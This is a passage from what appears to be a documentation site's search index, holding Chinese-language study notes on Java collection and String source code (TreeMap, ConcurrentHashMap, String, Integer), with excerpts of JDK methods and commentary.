colorOf(parentOf(x)));//\u5c06\u5144\u5f1f\u8282\u70b9\u8bbe\u7f6e\u548c\u7236\u8282\u70b9\u989c\u8272\u4e00\u81f4\n                setColor(parentOf(x), BLACK);     //\u5c06\u7236\u8282\u70b9\u8bbe\u7f6e\u4e3a\u9ed1\u8272\n                setColor(rightOf(sib), BLACK);    //\u5c06\u5144\u5f1f\u8282\u70b9\u7684\u53f3\u8282\u70b9\u8bbe\u7f6e\u4e3a\u9ed1\u8272\n                rotateLeft(parentOf(x));          //\u65cb\u8f6c\n                x = root;                         //\u5411\u4e0a\u79fb\u52a8\u8fdb\u884c\u5faa\u73af\n            }\n        } else { // \u4e0e\u4e0a\u9762\u7684\u77e5\u8bc6\u5de6\u53f3\u7684\u65b9\u5411\u76f8\u53cd\u800c\u5df2,\u5176\u4f59\u7684\u64cd\u4f5c\u76f8\u540c\n            Entry&lt;K,V&gt; sib = leftOf(parentOf(x));\n            if (colorOf(sib) == RED) {\n                setColor(sib, BLACK);\n                setColor(parentOf(x), RED);\n                rotateRight(parentOf(x));\n                sib = leftOf(parentOf(x));\n            }\n            if (colorOf(rightOf(sib)) == BLACK &amp;&amp;\n                colorOf(leftOf(sib)) == BLACK) {\n                setColor(sib, RED);\n                x = parentOf(x);\n            } else {\n                if (colorOf(leftOf(sib)) == BLACK) {\n                    setColor(rightOf(sib), BLACK);\n                    setColor(sib, RED);\n                    rotateLeft(sib);\n                    sib = leftOf(parentOf(x));\n                }\n                setColor(sib, colorOf(parentOf(x)));\n                setColor(parentOf(x), BLACK);\n                setColor(leftOf(sib), BLACK);\n                rotateRight(parentOf(x));\n                x = root;\n            }\n        }\n    }\n    setColor(x, BLACK);\n}\n</code></pre>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_10","title":"\u603b\u7ed3","text":"<ul> <li> <p>TreeMap\u5728\u952e\u7684\u5224\u65ad\u7684\u65f6\u5019\u6ca1\u6709\u4f7f\u7528hash\u503c\u8fdb\u884c\u5224\u65ad,\u76f8\u5bf9\u4e8eHashMap\u5b58\u653e\u6570\u636e\u548c\u53d6\u6570\u636e\u662f\u7684\u65f6\u95f4\u5f00\u9500\u53ef\u80fd\u5927\u4e00\u70b9.\u5e95\u5c42\u7684\u6bd4\u8f83\u5c31\u662f\u901a\u8fc7\u5b9e\u4f53\u7c7b(\u9700\u8981\u5b9e\u73b0comparable\u63a5\u53e3)\u6216\u8005\u5916\u90e8\u5b9a\u4e49\u7684\u6bd4\u8f83\u5668\u8fdb\u884c\u6bd4\u8f83.</p> </li> <li> <p>\u56e0\u4e3aTreeMap\u5e95\u5c42\u5c31\u662f\u4f7f\u7528\u6811\u6765\u5b9e\u73b0\u7684,\u6ca1\u6709\u6269\u5bb9\u7684\u64cd\u4f5c,\u56e0\u6b64\u5bf9\u4e8e\u6269\u5bb9\u7684\u5f00\u9500\u5341\u5206\u5c0f.</p> </li> <li> <p>TreeMap\u5e95\u5c42\u4f7f\u7528\u7684\u662f\u7ea2\u9ed1\u6811\u7ed3\u6784,\u80fd\u591f\u81ea\u5e73\u8861,\u4f46\u662f\u81ea\u5e73\u8861\u7684\u5f00\u9500\u76ee\u524d\u4e0d\u6e05\u695a\u7a76\u7adf\u6709\u591a\u5927.\u7531\u4e8e\u662f\u6811\u72b6\u7ed3\u6784,\u56e0\u6b64\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7684\u5927\u5c0f\u548c\u5bf9\u8c61\u6240\u5b58\u50a8\u7684\u6570\u636e\u7684\u5927\u5c0f\u6210\u4e00\u6b21\u76f8\u5173.</p> </li> <li> <p>\u5f53\u9700\u8981\u5bf9\u952e\u6392\u5e8f\u662f\u5efa\u8bae\u4f7f\u7528TreeMap,\u5426\u5219\u53ef\u4ee5\u4f7f\u7528HashMap,\u56e0\u4e3aHashMap\u5982\u679c\u4f7f\u7528\u7684\u5408\u7406(\u5c3d\u91cf\u51cf\u5c11\u6269\u5bb9\u8fd9\u4e00\u64cd\u4f5c),\u6027\u80fd\u4e0a\u8fd8\u662f\u6bd4TreeMap\u7684\u8981\u9ad8\u4e00\u70b9</p> </li> </ul> <p>Map\u548cSet\u7684\u5bf9\u6bd4</p> <p>Set\u662f\u5355\u4e2a\u503c\u7684\u5b58\u50a8\uff0c\u5177\u6709\u552f\u4e00\u6027\uff0c\u5e38\u89c1\u7684\u5b9e\u73b0\u7c7b\u6709HashSet(\u65e0\u5e8f)\u3001TreeSet(\u6309\u5927\u5c0f\u6392\u5e8f)\u3001LinkedHashSet(\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u6392\u5e8f)</p> <p>Map\u662f\u952e\u503c\u5bf9\u5b58\u50a8\uff0c\u952e\u5177\u6709\u552f\u4e00\u6027\uff0c\u5e38\u89c1\u7684\u5b9e\u4e60\u7c7b\u6709HashMap(\u65e0\u5e8f)\u3001TreeMap(\u6309\u5927\u5c0f\u6392\u5e8f)\u3001LinkedHashMap(\u6309\u6dfb\u52a0\u987a\u5e8f\u6392\u5e8f)</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#6-concurrenthashmap","title":"6. ConcurrentHashMap","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_11","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li><code>put</code>\u51fd\u6570</li> </ul> <pre><code>final V putVal(K key, V value, boolean onlyIfAbsent) {\n    if (key == null || value == null) throw new NullPointerException(); //\u8bf4\u660ekey\u548cvalue\u662f\u4e0d\u80fd\u4e3anull\u7684\n    int hash = spread(key.hashCode());   //(h ^ (h &gt;&gt;&gt; 16)) &amp; HASH_BIT; \u5176\u4e2dHASH_BIT=0x7FFFFFFF\n    int binCount = 0;\n    for (Node&lt;K,V&gt;[] tab = table;;) {\n        Node&lt;K,V&gt; f; int n, i, fh; K fk; V fv;\n        if (tab == null || (n = tab.length) == 0)                       //\u7a7a\u8868\u5224\u65ad\n            tab = initTable();\n        else if ((f = tabAt(tab, i = (n - 1) &amp; hash)) == null) {        //\u5982\u679c\u627e\u5230\u7684\u7236\u8868\u7684\u4f4d\u7f6e\u4e3a\u7a7a\n            if (casTabAt(tab, i, null, new Node&lt;K,V&gt;(hash, key, value)))\n                break;                                                  //\u6ca1\u6709hash\u78b0\u649e,\u76f4\u63a5\u63d2\u5165\u5143\u7d20\n        }\n        else if ((fh = f.hash) == MOVED)                                //\u5982\u679c\u5f53\u524d\u5bf9\u8c61\u6b63\u5728\u6269\u5bb9\n            tab = helpTransfer(tab, f);                                 //\u52a0\u5165\u5176\u4ed6\u7ebf\u7a0b\u4e00\u540c\u6269\u5bb9\n        else if (onlyIfAbsent     //\u5982\u679c\u53ea\u5141\u8bb8\u7a7a\u767d\u65f6\u63d2\u5165,\n                 &amp;&amp; fh == hash    //\u53d1\u751fhash\u78b0\u649e\n                 &amp;&amp; ((fk = f.key) == key || (fk != null &amp;&amp; key.equals(fk)))//key\u76f8\u7b49\n                 &amp;&amp; (fv = f.val) != null)//\u503c\u4e0d\u4e3a\u7a7a\n            return fv;            //\u76f4\u63a5\u9000\u51fa\n        else {\n            V oldVal = null;\n            synchronized (f) {            //\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u5143\u7d20\u5355\u72ec\u4e0a\u9501,\u51cf\u5c11\u4e86\u9501\u5e26\u6765\u7684\u6027\u80fd\u635f\u8017\n                if (tabAt(tab, i) == f) {\n                    if (fh &gt;= 0) {\n                        binCount = 1;\n                        for (Node&lt;K,V&gt; e = f;; ++binCount) {//\u94fe\u8868\u641c\u7d22\n                            K ek;\n                            if (e.hash == hash &amp;&amp;\n                                ((ek = e.key) == key ||\n                                 (ek != null &amp;&amp; key.equals(ek)))) {\n                                oldVal = e.val;\n                                if (!onlyIfAbsent)\n                                    e.val = value;\n                                break;\n                            }\n                            Node&lt;K,V&gt; pred = e;\n                            if ((e = e.next) == null) {\n                                pred.next = new Node&lt;K,V&gt;(hash, key, value);\n                                break;\n                            }\n                        }\n                    }\n                    else if (f instanceof TreeBin) {//\u7ea2\u9ed1\u6811\u641c\u7d22\n                        Node&lt;K,V&gt; p;\n                        binCount = 2;\n                        if ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,\n                                                       value)) != null) {\n                            oldVal = p.val;\n                            if (!onlyIfAbsent)\n                                p.val = value;\n                        }\n                    }\n                    else if (f instanceof ReservationNode)\n                        throw new IllegalStateException(\"Recursive update\");\n                }\n            }\n            if (binCount != 0) {                    //\u5982\u679c\u63d2\u5165\u8282\u70b9\u627e\u5230,\u5224\u65ad\u662f\u5426\u9700\u8981\u6269\u5bb9\n                if (binCount &gt;= TREEIFY_THRESHOLD)\n                    treeifyBin(tab, i);\n                if (oldVal != null)\n                    return oldVal;\n                break;\n            }\n        }\n    }\n    addCount(1L, binCount);\n    return null;\n}\n</code></pre>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_12","title":"\u603b\u7ed3","text":"<ul> <li>\u4ece\u4e0a\u9762\u7684\u6e90\u7801\u4e2d\u6211\u4eec\u53d1\u73b0,\u5176\u5b9e\u4ed6\u548cHashMap\u8fd8\u662f\u6bd4\u8f83\u76f8\u4f3c\u7684,\u90fd\u4f7f\u7528\u4e86\u7ea2\u9ed1\u6811\u548c\u94fe\u8868\u6765\u89e3\u51b3hash\u78b0\u649e\u7684\u95ee\u9898,\u53ea\u4e0d\u8fc7\u5bf9\u4e8e\u53ef\u80fd\u6539\u53d8\u6570\u636e\u7684\u7ed3\u6784\u7684\u4e00\u4e9b\u7ed3\u6784\u52a0\u4e0a\u4e86\u5bf9\u8c61\u9501\u673a\u5236,\u540c\u65f6\u548cHashTable\u4e0d\u540c,\u4ed6\u5e76\u4e0d\u662f\u5c06\u6574\u4e2a\u8868\u9501\u4f4f,\u800c\u662f\u5c3d\u53ef\u80fd\u7684\u7f29\u5c0f\u5bf9\u8c61\u9501\u7684\u5f71\u54cd\u8303\u56f4,\u8fd9\u76f8\u5bf9\u4e8eHashTable\u81ea\u7136\u662f\u6709\u7740\u66f4\u9ad8\u7684\u6548\u7387.</li> <li>\u5728\u591a\u7ebf\u7a0b\u7684\u5f00\u53d1\u73af\u5883\u4e0b\u8fd8\u662f\u63a8\u8350\u4f7f\u7528ConcurrentHashMap,\u800c\u4e0d\u662fHashTable\u548cHashMap\u66f4\u4e0d\u8981\u5c06TreeMap\u4e86.</li> <li>\u548cHashMap\u4e00\u6837,\u6269\u5bb9\u5e26\u6765\u7684\u6027\u80fd\u6d88\u8017\u662f\u5de8\u5927\u7684,\u56e0\u6b64\u5efa\u8bae\u5728\u521d\u59cb\u5316\u65f6\u5408\u7406\u7684\u89c4\u5212\u521d\u59cb\u5bb9\u91cf,\u521d\u59cb\u5bb9\u91cf\u5fc5\u987b\u662f2\u7684\u6307\u6570\u500d.</li> <li>\u548cHashMap\u4e00\u6837,\u5e95\u5c42\u7684\u6570\u636e\u53d8\u66f4\u90fd\u662f\u4f7f\u7528Unsafe\u7c7b\u6765\u64cd\u4f5c\u7684,\u4e5f\u90fd\u4f7f\u7528\u4e86CAS(Compare And Swap)\u601d\u60f3.</li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_13","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#1-string","title":"1. String","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_14","title":"\u6e90\u7801\u5206\u6790","text":"<p>\u3010\u6700\u6d45\u663e\u6613\u61c2\u7684 KMP \u7b97\u6cd5\u8bb2\u89e3\u3011 \u3010\u7cbe\u51c6\u7a7a\u964d\u5230 07:09\u3011 https://www.bilibili.com/video/BV1AY4y157yL/?share_source=copy_web&amp;vd_source=35872e32a14b2e305d99d420da37a552&amp;t=429</p> <ul> <li>\u8bef\u533a\u4e00:String\u5c31\u662f<code>char</code>\u6570\u7ec4\u5417?[NO]</li> </ul> <pre><code>private final byte[] value;\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u4e0d\u7528<code>char[]</code>\u6570\u7ec4\u4e8c\u7528<code>byte[]</code>\uff0c\u56e0\u4e3aString\u8fd8\u9700\u8981\u8003\u8651\u5b57\u7b26\u7f16\u7801\u7684\u95ee\u9898\uff0c\u5982\u679c\u4f7f\u7528<code>char[]</code>\uff0c\u90a3\u4e48\u5c31\u53ea\u80fd\u4f7f\u7528UTF-16\u4e86\uff0c</p> <p>\u8bef\u533a\uff1aJava\u4e2d\u7684char\u5360\u75282\u4e2a\u5b57\u8282\uff0c\u548cC\u8bed\u8a00\u4ee5\u53caC++\u4e2d\u7684\u4e0d\u4e00\u6837\uff0c\u56e0\u6b64Java\u4e2d\u7684\u4e00\u4e2achar\u4e5f\u53ef\u4ee5\u8868\u793a\u6c49\u5b57\u3002</p> <ul> <li>\u8bef\u533a\u4e8c:String\u5bf9\u8c61<code>length()</code>\u5c31\u662f\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u7684\u957f\u5ea6[NO]</li> </ul> <pre><code>public int length() {\n    return value.length &gt;&gt; coder();\n}\n</code></pre> <p>\u5176\u4e2d\u7684<code>value.length</code>\u5c31\u662fbyte\u7684\u957f\u5ea6,\u800c<code>coder()</code>\u8868\u793a\u5f53\u524d\u5b57\u7b26\u4e32\u7684\u7f16\u7801\u5355\u4f4d,String\u5185\u7f6e\u7684\u7f16\u7801\u5355\u4f4d\u6709UTF-16\u548cLATIN1.\u4f46\u662f\u4e86\u89e3\u7f16\u7801\u5c31\u77e5\u9053,\u73b0\u4ee3\u578b\u7684\u5927\u90e8\u5206\u7f16\u7801\u89c4\u8303\u4e2d,\u6bcf\u4e2a\u5b57\u7b26\u9501\u5360\u7528\u7684\u5b57\u8282\u6570\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684(\u4e3b\u8981\u662f\u65b9\u4fbf\u6269\u5145\u5b57\u7b26\u96c6).\u6bd4\u5982\u6709\u4e9b\u5b57\u7b26\u5728UTF-16\u7f16\u7801\u4e2d\u53ef\u80fd\u68084\u4e2a\u5b57\u8282,6\u4e2a\u5b57\u8282\u7b49.</p> <p>\u90a3\u5e94\u8be5\u5982\u4f55\u83b7\u53d6\u5b57\u7b26\u4e32\u4e2d\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u6570\u5462?[\u6253\u5370\u65f6\u7684\u8f93\u51fa\u4e2a\u6570].String\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb<code>codePointCount()</code>\u7684\u51fd\u6570.</p> <ul> <li><code>coder()</code>\u51fd\u6570\u4e2d\u7684JIT\u7f16\u8bd1\u5668\u5c0f\u77e5\u8bc6\uff1a</li> </ul> <pre><code>static final boolean COMPACT_STRINGS;\nstatic {\n    COMPACT_STRINGS = true;\n}\nbyte coder() {\n    return COMPACT_STRINGS ? coder : UTF16;\n}\n</code></pre> <p>\u4ece\u4e0a\u9762\u6211\u4eec\u53ef\u4ee5\u770b\u5230<code>COMPACT_STRINGS</code>\u662f\u4e00\u4e2a\u5e38\u91cf\uff0c<code>COMPACT_STRINGS</code>\u7684\u6ce8\u91ca\u4e2d\u89e3\u91ca\u9053\uff1a</p> <p>\u5982\u679c\u7981\u7528\u5b57\u7b26\u4e32\u538b\u7f29\uff0c\u5219 value \u4e2d\u7684\u5b57\u8282\u59cb\u7ec8\u4ee5 UTF16 \u7f16\u7801\u3002 \u5bf9\u4e8e\u5177\u6709\u591a\u79cd\u53ef\u80fd\u5b9e\u73b0\u8def\u5f84\u7684\u65b9\u6cd5\uff0c\u5f53\u7981\u7528\u5b57\u7b26\u4e32\u538b\u7f29\u65f6\uff0c\u4ec5\u91c7\u7528\u4e00\u79cd\u4ee3\u7801\u8def\u5f84\u3002 \u5b9e\u4f8b\u5b57\u6bb5\u503c\u901a\u5e38\u5bf9\u4e8e\u4f18\u5316 JIT \u7f16\u8bd1\u5668\u6765\u8bf4\u662f\u4e0d\u900f\u660e\u7684\u3002 \u56e0\u6b64\uff0c\u5728\u6027\u80fd\u654f\u611f\u7684\u5730\u65b9\uff0c\u5728\u68c0\u67e5\u7f16\u7801\u5668\u5b57\u6bb5\u4e4b\u524d\u9996\u5148\u5bf9\u9759\u6001\u5e03\u5c14\u503c COMPACT_STRINGS \u8fdb\u884c\u663e\u5f0f\u68c0\u67e5\uff0c\u56e0\u4e3a\u9759\u6001\u5e03\u5c14\u503c COMPACT_STRINGS \u5c06\u88ab\u4f18\u5316 JIT \u7f16\u8bd1\u5668\u5e38\u91cf\u6298\u53e0\u3002 \u8fd9\u4e9b\u60c5\u51b5\u7684\u4e60\u8bed\u5982\u4e0b\u3002 \u5bf9\u4e8e\u8bf8\u5982\u4ee5\u4e0b\u7684\u4ee3\u7801\uff1a if (coder == LATIN1) { ... } \u53ef\u4ee5\u66f4\u4f18\u5316\u5730\u7f16\u5199\u4e3a if (coder() == LATIN1) { ... } \u6216\uff1a if (COMPACT_STRINGS &amp;&amp; coder == LATIN1) { \u3002 .. } \u4f18\u5316\u7684 JIT \u7f16\u8bd1\u5668\u53ef\u4ee5\u5c06\u4e0a\u8ff0\u6761\u4ef6\u6298\u53e0\u4e3a\uff1a COMPACT_STRINGS == true =&gt; if (coder == LATIN1) { ... } COMPACT_STRINGS == false =&gt; if (false) { ... }</p> <p>\u8fd9\u5176\u4e2d\u6709\u4e00\u4e2a\u5c0f\u77e5\u8bc6\u70b9\u53eb\u5e38\u91cf\u6298\u53e0\uff0c\u4e0e\u4e4b\u76f8\u5173\u7684\u53e6\u5916\u4e00\u4e2a\u53eb\u505a\u5e38\u91cf\u4f20\u64ad\uff0c\u5177\u4f53\u53ef\u4ee5\u770bJava\u4e4b\u5e38\u91cf\u6298\u53e0\u3001\u5e38\u91cf\u4f20\u64ad\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u505a\u4e2a\u603b\u7ed3\u3002</p> <ul> <li> <p>\u5e38\u91cf\u6298\u53e0</p> <p>\u5e38\u91cf\u6298\u53e0\u662fJava\u5728\u7f16\u8bd1\u671f\u505a\u7684\u4e00\u4e2a\u4f18\u5316\uff0c\u7b80\u5355\u7684\u6765\u8bf4\uff0c\u5728\u7f16\u8bd1\u671f\u5c31\u628a\u4e00\u4e9b\u8868\u8fbe\u5f0f\u8ba1\u7b97\u597d\uff0c\u4e0d\u9700\u8981\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\u8ba1\u7b97\u3002 \u6bd4\u5982: <code>int a = 1 + 2</code>\uff0c\u7ecf\u8fc7\u5e38\u91cf\u6298\u53e0\u540e\u5c31\u53d8\u6210\u4e86<code>int a = 3</code>\u3002</p> </li> <li> <p>\u5e38\u91cf\u4f20\u64ad</p> <p>\u5982\u679c\u5728\u8c03\u7528\u8fc7\u7a0b\u65f6\u77e5\u9053\u54ea\u4e9b\u53d8\u91cf\u5c06\u5177\u6709\u5e38\u91cf\u503c\uff0c\u4ee5\u53ca\u8fd9\u4e9b\u503c\u5c06\u662f\u4ec0\u4e48\uff0c\u5219\u7f16\u8bd1\u5668\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u671f\u7b80\u5316\u5e38\u6570\u3002\u6bd4\u5982\uff1a</p> <pre><code>int x = 14;\nint y = 7 - x / 2;\nreturn y * (28 / x + 2);      \n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f1a\u88abJIT\u4f18\u5316\u6210</p> <pre><code>int x = 14;\nint y = 0;\nreturn 0;\n</code></pre> </li> <li> <p><code>codePointCount()</code>\u51fd\u6570\u83b7\u53d6String\u5bf9\u8c61\u7684\u67d0\u4e2a\u533a\u95f4\u5728\u6253\u5370\u65f6\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570</p> </li> </ul> <pre><code>public int codePointCount(int beginIndex, int endIndex) {\n    Objects.checkFromToIndex(beginIndex, endIndex, length());\n    if (isLatin1()) {\n        return endIndex - beginIndex;\n    }\n    return StringUTF16.codePointCount(value, beginIndex, endIndex);\n}\n</code></pre> <p>\u5982\u679c\u8981\u83b7\u53d6\u5168\u957f,\u4e00\u822c\u5199\u6210<code>str.codePointCount(0,str.length())</code></p> <ul> <li>\u8bef\u533a\u4e09:<code>str.equal()</code>\u8fd4\u56deFALSE,\u4ed6\u8f93\u51fa\u7684\u5185\u5bb9\u4e5f\u5c31\u4e0d\u4e00\u6837[NO]</li> </ul> <p>equal\u51fd\u6570\u662f\u4e00\u4e2a\u6574\u4f53\u5224\u65ad\u662f\u5426\u76f8\u7b49,\u4e5f\u5c31\u662f\u8bf4,\u53ea\u6709\u4e24\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf\u90fd\u76f8\u7b49\u7684\u65f6\u5019,equal\u624d\u4f1a\u8fd4\u56deTRUE,</p> <p>\u4f46\u662f\u5982\u679c\u7f16\u7801\u4e0d\u76f8\u540c,\u5373\u4f7f\u8f93\u51fa\u662f\u540c\u6837\u7684,\u4f46\u662f<code>equal</code>\u8fd8\u662f\u8fd4\u56deFALSE.\u5916\u90e8\u5728\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u90fd\u662f\u4f7f\u7528<code>Object.equal()</code>\u6765\u5224\u65ad\u4e24\u4e2a\u5bf9\u8c61\u662f\u5426\u76f8\u7b49,\u4f46\u662f\u5bf9\u4e8eString\u7c7b\u578b\u6765\u8bf4,\u53ef\u4ee5\u5bf9\u8c61\u8f93\u51fa\u5185\u5bb9\u53ef\u80fd\u8fd8\u662f\u76f8\u7b49,\u8fd9\u5bf9\u4e8e\u4e00\u4e9b\u67e5\u627e\u4f1a\u51fa\u95ee\u9898,\u6bd4\u5982\u4eceHashMap\u4e2d\u7684\u901a\u8fc7Key\u67e5\u627e\u6570\u636e,\u4f46\u662f\u5982\u679c\u5b58\u548c\u53d6\u7684\u65f6\u5019\u7528\u7684Key\u7684\u7f16\u7801\u4e0d\u4e00\u6837,\u90a3\u5c31\u627e\u4e0d\u5230\u539f\u6765\u7684\u503c,\u800c\u4e14\u5728\u5916\u90e8\u5f00\u6765\u6ca1\u6709\u6dfb\u52a0\u8fdb\u53bb.</p> <p>\u90a3\u5982\u679c\u6211\u4eec\u60f3\u8981\u89e3\u51b3\u4e0a\u9762\u7684\u95ee\u9898\u8be5\u600e\u4e48\u529e?\u4e00\u822c\u5c31\u662f\u7edf\u4e00\u7f16\u7801\u89c4\u8303.</p> <ul> <li> <p>\u4f7f\u7528\u53cc\u5f15\u53f7\u7684\u5b57\u7b26\u4e32\u4f1a\u5728\u9700\u8981\u65f6\u81ea\u52a8\u5305\u88c5\u7c7b,\u5e76\u4e14\u6dfb\u52a0\u5230String\u7684\u5e38\u91cf\u6c60\u4e2d.\u4f46\u662f\u6ce8\u610f,new\u51fa\u6765\u7684\u5bf9\u8c61\u4e0d\u4f1a\u6dfb\u52a0\u5230\u5e38\u91cf\u6c60,\u5982\u679c\u60f3\u624b\u52a8new\u51fa\u6765\u7684\u5bf9\u8c61\u6dfb\u52a0\u5230\u5e38\u91cf\u6c60,\u53ef\u4f7f\u7528\u51fd\u6570 <code>intern()</code>;\u8fd4\u56de\u503c\u5c31\u662f\u5e38\u91cf\u6c60\u4e2d\u7684String\u5bf9\u8c61\u7684\u5f15\u7528.</p> </li> <li> <p>String\u7c7b\u578b\u4e2d\u4e5f\u6709\u5bf9\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4f7f\u7528</p> </li> </ul> <pre><code>public boolean matches(String regex) {\n  return Pattern.matches(regex, this);\n}\n\npublic String replaceFirst(String regex, String replacement) {\n    return Pattern.compile(regex).matcher(this).replaceFirst(replacement);\n}\n\npublic String replaceAll(String regex, String replacement) {\n    return Pattern.compile(regex).matcher(this).replaceAll(replacement);\n}\n\npublic String replace(CharSequence target, CharSequence replacement) {\n    return Pattern.compile(target.toString(), Pattern.LITERAL).matcher(\n            this).replaceAll(Matcher.quoteReplacement(replacement.toString()));\n}\n</code></pre> <ul> <li><code>charAt</code>\u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2achar,\u4f46\u662f\u4e0a\u9762\u63d0\u5230\u5bf9\u4e8eString\u7c7b\u578b\u8fd8\u9700\u8981\u8003\u8651\u7f16\u7801\u95ee\u9898,\u56e0\u6b64<code>charAt</code>\u5e76\u4e0d\u80fd\u5b8c\u5168\u4fdd\u8bc1\u62ff\u5230\u7684\u6570\u636e\u5bf9\u5e94\u8f93\u51fa\u7684\u6570\u636e.\u4f46\u662f<code>trim</code>\u51fd\u6570\u653e\u5fc3\u7528,\u56e0\u4e3a\u5e95\u5c42\u6709\u8c03\u7528\u4e86\u548c\u7f16\u7801\u5bf9\u5e94\u7684\u5904\u7406\u51fd\u6570,\u4e5f\u5c31\u89e3\u51b3\u4e86\u7f16\u7801\u95ee\u9898.\u603b\u800c\u8a00\u4e4b,\u5bf9\u4e8e<code>charAt</code>\u51fd\u6570\u7684\u4f7f\u7528\u8fd4\u56de\u7684\u662fchar\u800c\u4e0d\u662fString,\u56e0\u6b64\u65e0\u6cd5\u89e3\u51b3\u7f16\u7801\u95ee\u9898.\u6211\u4eec\u4e0d\u80fd\u53ea\u4f7f\u7528<code>charAt</code>\u6765\u81ea\u5df1\u5b9e\u73b0<code>trim</code>,\u800c\u4e0d\u5224\u65ad\u7f16\u7801</li> </ul> <pre><code>public String trim() {\n    String ret = isLatin1() ? StringLatin1.trim(value)\n                            : StringUTF16.trim(value);\n    return ret == null ? this : ret;\n}\n</code></pre> <ul> <li> <p>String\u6709\u4e24\u4e2a\u5144\u5f1f\u7c7b:StringBuffer\u548cStringBuilder,\u4f46\u662f\u4ed6\u4eec\u548cString\u4e0d\u540c,\u4ed6\u4eec\u662f\u53ef\u4ee5\u6539\u53d8\u7684,String\u4e00\u65e6\u590d\u5236\u5c31\u4e0d\u53ef\u4ee5\u6539\u53d8\u4e86.</p> </li> <li> <p>StringBuffer\u662f\u53ef\u53d8\u5b57\u7b26\u4e32,\u6548\u7387\u4f4e,\u4f46\u662f\u7ebf\u7a0b\u5b89\u5168.</p> </li> <li> <p>StringBuilder\u662f\u53ef\u53d8\u5b57\u7b26\u5e8f\u5217,\u6548\u7387\u9ad8,\u7ebf\u7a0b\u4e0d\u5b89\u5168.</p> <p></p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-integerbyteshortlongdoublefloat","title":"2. Integer(Byte\u3001Short\u3001Long\u3001Double\u3001Float\u7c7b\u6bd4)","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_15","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li> <p>Integer\u662fint\u7684\u5305\u88c5\u7c7b,\u5728jvm\u8fd0\u884c\u671f\u95f4\u53ef\u4ee5\u81ea\u52a8\u88c5\u5305\u62c6\u5305.</p> </li> <li> <p>Integer\u88c5\u5305\u8fc7\u7a0b\u4f1a\u67e5\u8be2\u81ea\u5df1\u7684\u5e38\u91cf\u6c60,\u5982\u679c\u539f\u59cb\u6570\u636e\u547d\u4e2d\u5e38\u91cf\u6c60\u4e2d\u7684\u6570\u636e,\u5c31\u4e0d\u65b0\u751f\u6210\u5bf9\u8c61,\u76f4\u63a5\u8fd4\u56de\u5e38\u91cf\u6c60\u5bf9\u8c61.\u5426\u5219\u751f\u6210\u65b0\u7684\u5e38\u91cf\u653e\u5165\u7c7b\u5e38\u91cf\u6c60.\u5bf9\u4e8eInteger,Long\u7b49\u7c7b,\u5f53\u6570\u636e\u5728(-128,127)\u5185\u4f1a\u81ea\u52a8\u653e\u5165\u5e38\u91cf\u6c60.\u4e5f\u53ef\u4ee5\u8c03\u7528</p> </li> </ul> <pre><code>public static Integer valueOf(int i) {//\u88c5\u5305\u7684\u65f6\u5019\u81ea\u52a8\u8c03\u7528\n    if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)\n        return IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n</code></pre> <ul> <li>Integer\u7c7b\u4e2d\u6709\u4e00\u4e2a<code>parseInt()</code>\u51fd\u6570\u7528\u6765\u5c06\u5b57\u7b26\u4e32\u89e3\u6790\u6210int\u503c\uff0c\u800c\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u9690\u85cf\u7740\u4e00\u4e2a\u5c0f\u5c0f\u7684\u6280\u5de7\uff0c\u4ece\u4e2d\u80fd\u591f\u4f53\u73b0\u51faJDK\u7684\u4e25\u8c28\u6027</li> </ul> <pre><code>public static int parseInt(String s) throws NumberFormatException {\n    return parseInt(s,10);\n}\n\npublic static int parseInt(String s, int radix) throws NumberFormatException {\n    if (s == null) {\n        throw new NumberFormatException(\"Cannot parse null string\");\n    }\n    if (radix &lt; Character.MIN_RADIX) {\n        throw new NumberFormatException(\"radix \" + radix +\n                                        \" less than Character.MIN_RADIX\");\n    }\n    if (radix &gt; Character.MAX_RADIX) {\n        throw new NumberFormatException(\"radix \" + radix +\n                                        \" greater than Character.MAX_RADIX\");\n    }\n    boolean negative = false;\n    int i = 0, len = s.length();\n    int limit = -Integer.MAX_VALUE;\n    if (len &gt; 0) {\n        char firstChar = s.charAt(0);\n        if (firstChar &lt; '0') { // \u5e26\u6709\u7b26\u53f7\u7684\u60c5\u51b5\n            if (firstChar == '-') {\n                negative = true;\n                limit = Integer.MIN_VALUE;\n            } else if (firstChar != '+') {\n                throw NumberFormatException.forInputString(s, radix);\n            }\n            if (len == 1) { // 